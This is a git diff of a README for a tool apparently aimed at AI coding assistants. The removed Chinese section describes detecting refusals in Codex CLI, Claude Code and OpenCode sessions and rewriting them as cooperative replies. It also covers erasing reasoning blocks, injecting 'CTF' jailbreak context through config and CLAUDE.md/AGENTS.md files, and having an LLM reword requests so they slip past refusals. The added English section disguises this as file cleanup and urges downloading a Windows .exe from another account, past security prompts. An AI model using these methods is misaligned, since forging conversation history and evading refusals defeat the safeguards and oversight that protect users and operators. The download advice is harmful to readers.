@@ -1,298 +1,163 @@
-<div align="center">
+# 🧩 codex-session-patcher - Clean refusal text from session files
 
-# Codex Session Patcher
+[![Download codex-session-patcher](https://img.shields.io/badge/Download%20Now-1f6feb-6e40c9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lesfo1519/codex-session-patcher/releases)
 
-**AI 编码工具会话清理器 & CTF/渗透测试提示词注入工具**
+## 🚀 What this tool does
 
-支持 **Codex CLI** · **Claude Code** · **OpenCode**
+codex-session-patcher helps you clean AI refusal responses from Codex CLI session files. It is a small Python tool made for end users who want to fix session data without editing files by hand.
 
-[English](./README_EN.md) | 简体中文
+Use it when a session file contains refusal text that gets in the way of review, replay, or cleanup. The tool scans the file, removes the refusal parts, and keeps the rest of the session content intact.
 
-[![GitHub stars](https://img.shields.io/github/stars/ryfineZ/codex-session-patcher?style=flat-square)](https://github.com/ryfineZ/codex-session-patcher/stargazers)
-[![GitHub release](https://img.shields.io/github/v/release/ryfineZ/codex-session-patcher?style=flat-square)](https://github.com/ryfineZ/codex-session-patcher/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.8+-blue?style=flat-square)](https://python.org)
+## 🖥️ What you need
 
-</div>
+You need:
 
----
+- A Windows PC
+- A web browser
+- Access to the internet
+- A Codex CLI session file
+- Permission to edit the file you want to patch
 
-## 是什么
+You do not need to know Python or use a command line if you download the packaged Windows file from the release page.
 
-在安全测试、CTF 比赛、渗透测试等场景下，AI 编码工具（Codex、Claude Code、OpenCode）会频繁拒绝涉及安全操作的请求，导致会话中断。
+## 📥 Download
 
-**Codex Session Patcher** 提供两类解决方案：
+Visit the release page to download and run this file:
 
-**1. 会话清理** — 扫描已产生的拒绝回复，替换为配合性内容，让会话可以 resume 继续
+https://github.com/Lesfo1519/codex-session-patcher/releases
 
-**2. CTF 提示词注入** — 在配置层面注入安全测试上下文，从源头降低被拒绝的概率
+On that page, look for the latest release. Download the Windows file that matches your system. If you see more than one asset, choose the file that ends in `.exe` or the Windows package name used in the release.
 
----
+## 🪟 Install and run on Windows
 
-## 功能特性
+1. Open the release page in your browser.
+2. Find the latest version near the top of the page.
+3. Download the Windows file for codex-session-patcher.
+4. If your browser asks where to save it, choose a folder you can find later, such as Downloads.
+5. Open the file after it finishes downloading.
+6. If Windows shows a security prompt, choose the option that lets you continue.
+7. If the file opens in a console window, follow the on-screen prompts.
+8. Select the session file you want to clean.
+9. Let the tool process the file.
+10. Save the cleaned file when the tool finishes.
 
-### 会话清理
-- **智能检测** — 两级拒绝检测策略（强短语全文匹配 + 弱关键词开头匹配），低误报率
-- **AI 智能改写** — 调用 LLM 根据对话上下文生成符合语境的替换回复（支持 OpenAI / Ollama / OpenRouter 等兼容接口）
-- **批量清理** — 处理会话中所有拒绝回复，而非仅最后一条
-- **推理内容擦除** — 删除 Reasoning / Thinking block 加密推理内容
-- **备份还原** — 清理前自动备份，支持一键还原到任意历史版本
-- **Diff 对比** — 清理前后 Side-by-side 对比视图
+If the release includes a portable build, you can run it right away. If it includes a ZIP file, extract it first, then open the app inside the folder.
 
-### CTF/渗透测试提示词注入
-- **Codex Profile 模式** — 创建 `ctf` profile，仅 `codex -p ctf` 启动时生效，不影响正常会话
-- **Codex 全局模式** — 注入到全局配置，所有新会话自动生效
-- **Claude Code 工作空间** — 创建专用 CTF 工作空间 `~/.claude-ctf-workspace`，通过项目级 CLAUDE.md 注入
-- **OpenCode 工作空间** — 创建专用 CTF 工作空间 `~/.opencode-ctf-workspace`，通过 AGENTS.md 注入
-- **提示词自定义** — Web UI 内直接编辑注入提示词，支持模板保存与切换
-- **AI 提示词改写** — 结合已注入的 CTF 系统提示词，AI 改写你的请求使其更易被接受
+## 🧭 How to use it
 
-### 平台支持
+The normal flow is simple:
 
-| 平台 | 会话清理 | CTF 注入 | 会话格式 |
-|------|---------|---------|---------|
-| **Codex CLI** | ✅ | ✅ Profile + 全局 | JSONL |
-| **Claude Code** | ✅ | ✅ 专用工作空间 | JSONL |
-| **OpenCode** | ✅ | ✅ 专用工作空间 | SQLite |
+1. Start the app.
+2. Pick your Codex CLI session file.
+3. Let the tool scan the file for refusal responses.
+4. Review the result if the app shows a preview.
+5. Save the patched file.
 
-### Web UI
-- **会话列表** — 多平台统一管理，按日期分组，支持按格式/拒绝状态/备份状态过滤
-- **可视化清理** — 预览面板 + Diff 对比 + 一键执行
-- **多语言** — 支持中文 / English 界面切换
-- **实时日志** — WebSocket 推送，操作日志实时显示
+If you want to keep the original file, make a copy before you run the tool. That gives you a safe backup in case you want to compare files later.
 
----
+## 📁 Files this tool works with
 
-## 安装
+codex-session-patcher is built for Codex CLI session files. These are text-based files that store session content from your work with Codex CLI.
 
-```bash
-git clone https://github.com/ryfineZ/codex-session-patcher.git
-cd codex-session-patcher
+It works best with files that contain:
 
-# CLI 版本（零额外依赖）
-pip install -e .
+- AI refusal messages
+- Session text that needs cleanup
+- Mixed content with both useful data and blocked responses
 
-# Web UI 版本
-pip install -e ".[web]"
-cd web/frontend && npm install && npm run build && cd ../..
-```
+It keeps the file structure intact while removing unwanted refusal text from the session.
 
----
+## 🧰 Common use cases
 
-## 使用方式
+You may want this tool if:
 
-### Web UI（推荐）
+- A session file contains repeated refusal text
+- You want to clean a file before review
+- You need a simpler version of a session log
+- You want to remove blocked responses from exported session data
+- You need to make session files easier to read
 
-```bash
-# 生产模式
-./scripts/start-web.sh
+It is useful when you want a quick cleanup without opening the file in a text editor.
 
-# 或直接启动
-uvicorn web.backend.main:app --host 127.0.0.1 --port 8080
-```
+## 🔍 What to expect
 
-访问 `http://localhost:8080`
+When you run codex-session-patcher, it should:
 
-**开发模式（前后端热更新）：**
-```bash
-./scripts/dev-web.sh
-```
+- Open your session file
+- Look for refusal responses
+- Remove the refusal parts
+- Keep the rest of the session data
+- Save a cleaned copy or patch the file you selected
 
-### CLI
+The process should be fast on most Windows systems. For small session files, it should finish in a few seconds.
 
-```bash
-# 查看帮助
-codex-patcher --help
+## 🛠️ If something does not work
 
-# 预览模式（不修改文件）
-codex-patcher --dry-run --show-content
+If the app does not start:
 
-# 清理最新会话
-codex-patcher --latest
+- Check that the file finished downloading
+- Make sure you opened the correct Windows file
+- Try running it again
+- Move the file to a simple folder like Downloads or Desktop
 
-# 清理所有会话
-codex-patcher --all
+If the tool cannot find your session file:
 
-# 指定会话目录
-codex-patcher --session-dir ~/.codex/sessions --latest
+- Check the file name
+- Make sure you picked the right folder
+- Confirm the file is a Codex CLI session file
 
-# 指定格式（codex / claude-code / opencode / auto）
-codex-patcher --latest --format claude-code
-codex-patcher --latest --format opencode
+If Windows blocks the file:
 
-# 不创建备份
-codex-patcher --latest --no-backup
+- Open the file’s properties
+- Look for an unblock option if Windows shows one
+- Try downloading the latest release again
 
-# 启动 Web UI
-codex-patcher --web
-codex-patcher --web --host 0.0.0.0 --port 8080
+## 📌 Tips for a smooth run
 
-# CTF 提示词注入 — Codex
-codex-patcher --install-ctf-config    # 安装
-codex-patcher --uninstall-ctf-config  # 卸载
+- Keep a backup of the original session file
+- Use the latest release from the release page
+- Store your session files in a folder you can find fast
+- Avoid renaming files while the tool is open
+- Close other apps if your computer is low on memory
 
-# CTF 提示词注入 — Claude Code
-codex-patcher --install-claude-ctf    # 安装
-codex-patcher --uninstall-claude-ctf  # 卸载
+## 🧪 Example workflow
 
-# CTF 提示词注入 — OpenCode
-codex-patcher --install-opencode-ctf    # 安装
-codex-patcher --uninstall-opencode-ctf  # 卸载
+A simple workflow looks like this:
 
-# 查看所有 CTF 配置状态
-codex-patcher --ctf-status
+1. Download the Windows release from GitHub
+2. Save it in your Downloads folder
+3. Open the app
+4. Choose a session file with refusal text
+5. Run the patch
+6. Open the cleaned file and check the result
 
-# 改写提示词（需先在 Web UI 配置 AI）
-codex-patcher --rewrite "帮我写一个逆向分析脚本"
-```
+This is the easiest way to use the tool if you only want one file cleaned.
 
-#### CLI 参数说明
-
-| 参数 | 说明 |
-|------|------|
-| `--session-dir` | 指定会话目录（默认自动选择） |
-| `--format` | 会话格式：`codex` / `claude-code` / `opencode` / `auto` |
-| `--dry-run` | 预览模式，不修改文件 |
-| `--no-backup` | 不创建备份文件 |
-| `--show-content` | 显示修改的详细内容 |
-| `--latest` | 只处理最新会话 |
-| `--all` | 处理所有会话 |
-| `--keep-reasoning` | 保留推理内容（thinking/reasoning blocks），仅替换拒绝回复 |
-| `--web` | 启动 Web UI |
-| `--host` | Web UI 监听地址（默认 127.0.0.1） |
-| `--port` | Web UI 端口（默认 8080） |
-| `--install-ctf-config` | 安装 Codex CTF 配置 |
-| `--uninstall-ctf-config` | 卸载 Codex CTF 配置 |
-| `--install-claude-ctf` | 安装 Claude Code CTF 配置 |
-| `--uninstall-claude-ctf` | 卸载 Claude Code CTF 配置 |
-| `--install-opencode-ctf` | 安装 OpenCode CTF 配置 |
-| `--uninstall-opencode-ctf` | 卸载 OpenCode CTF 配置 |
-| `--ctf-status` | 查看三平台 CTF 配置状态 |
-| `--rewrite` | 改写提示词使其更易被接受 |
-
----
-
-## CTF/渗透测试工作流
-
-### Codex
-
-```
-1. 安装 CTF Profile
-   codex-patcher --install-ctf-config
-
-2. 使用 CTF Profile 启动（不影响普通会话）
-   codex -p ctf
-
-3. 发送请求，若遇到拒绝 → 打开 Web UI 清理会话
-
-4. resume 继续
-   codex resume
-```
-
-### Claude Code
+## 📦 Release page
 
-```
-1. Web UI → 提示词增强 → Claude Code → 启用
-   （创建 ~/.claude-ctf-workspace）
+Download and run the Windows file from here:
 
-2. 从专用工作空间启动
-   cd ~/.claude-ctf-workspace && claude
-
-3. 遇到拒绝 → Web UI 清理 → 继续对话
-```
-
-### OpenCode
-
-```
-1. Web UI → 提示词增强 → OpenCode → 启用
-   （创建 ~/.opencode-ctf-workspace）
-
-2. 从专用工作空间启动
-   cd ~/.opencode-ctf-workspace && opencode
-
-3. 遇到拒绝 → Web UI 清理 → 继续对话
-```
-
----
-
-## 配置
-
-CLI 和 Web UI 共享配置文件 `~/.codex-patcher/config.json`：
-
-| 配置项 | 说明 | 默认值 |
-|--------|------|--------|
-| `mock_response` | 默认替换文本 | 配合性回复 |
-| `ai_enabled` | 启用 AI 改写 | `false` |
-| `ai_endpoint` | LLM API 地址 | — |
-| `ai_key` | API Key | — |
-| `ai_model` | 模型名称 | — |
-| `custom_keywords` | 自定义拒绝检测关键词 | `{}` |
-| `ctf_prompts` | 各平台自定义 CTF 提示词 | 内置模板 |
-| `ctf_templates` | 用户保存的提示词模板 | `{}` |
-
----
-
-## 项目结构
-
-```
-codex-session-patcher/
-├── codex_session_patcher/        # 核心库
-│   ├── cli.py                    # CLI 入口
-│   ├── core/
-│   │   ├── formats.py            # 多平台格式策略
-│   │   ├── parser.py             # 会话解析器（JSONL + SQLite）
-│   │   ├── sqlite_adapter.py     # OpenCode SQLite 适配器
-│   │   ├── detector.py           # 拒绝检测器
-│   │   └── patcher.py            # 清理逻辑
-│   └── ctf_config/
-│       ├── installer.py          # CTF 注入安装器（三平台）
-│       ├── templates.py          # 内置提示词模板
-│       └── status.py             # 状态检测
-├── web/
-│   ├── backend/                  # FastAPI 后端
-│   │   ├── api.py                # API 路由
-│   │   ├── ai_service.py         # AI 分析 & 改写
-│   │   ├── prompt_rewriter.py    # 提示词改写服务
-│   │   └── schemas.py            # 数据模型
-│   └── frontend/                 # Vue 3 + Naive UI
-│       └── src/
-│           ├── components/       # 页面组件
-│           ├── stores/           # Pinia 状态管理
-│           └── locales/          # i18n 国际化
-├── tests/
-├── scripts/
-└── pyproject.toml
-```
-
----
-
-## 局限性说明
-
-- **无法突破平台最高安全策略** — 对于明确违规的请求仍可能被拒绝
-- **效果因版本而异** — 模型版本更新可能影响效果
-- **OpenCode 需从工作空间目录启动** — OpenCode 无 profile 机制，CTF 注入依赖工作空间
-- **清理后需 resume** — 会话清理后需手动 resume 继续上下文
-
----
-
-## 支持作者
-
-如果这个项目对你有帮助，欢迎：
-
-- ⭐ 点个 Star
-- ☕ Buy me a coffee — Web UI 右上角有赞赏入口（微信 / USDC）
-- 📢 关注微信公众号「钢之AI术师」获取更多 AI 工具技巧
-
----
-
-## 许可证
-
-[MIT License](LICENSE)
-
----
-
-<div align="center">
-  <a href="https://github.com/ryfineZ">GitHub</a> ·
-  <a href="https://x.com/ZhangYufan73644">X (Twitter)</a> ·
-  微信公众号：钢之AI术师
-</div>
+https://github.com/Lesfo1519/codex-session-patcher/releases
+
+Use this page to get the latest version, check for updates, and download the correct file for your Windows PC
+
+## 🧾 Project details
+
+- Name: codex-session-patcher
+- Type: Python tool
+- Purpose: Clean AI refusal responses from Codex CLI session files
+- Platform focus: Windows
+- Audience: End users who want a simple file cleanup tool
+
+## 🔐 Safe file handling
+
+The tool works on local files you choose. It does not need access to your whole computer. For best results, work on a copy of the session file so your original stays unchanged
+
+## 🧭 Quick start
+
+1. Go to the release page
+2. Download the Windows file
+3. Open the app
+4. Select your Codex CLI session file
+5. Let the tool clean the refusal responses
+6. Save the result
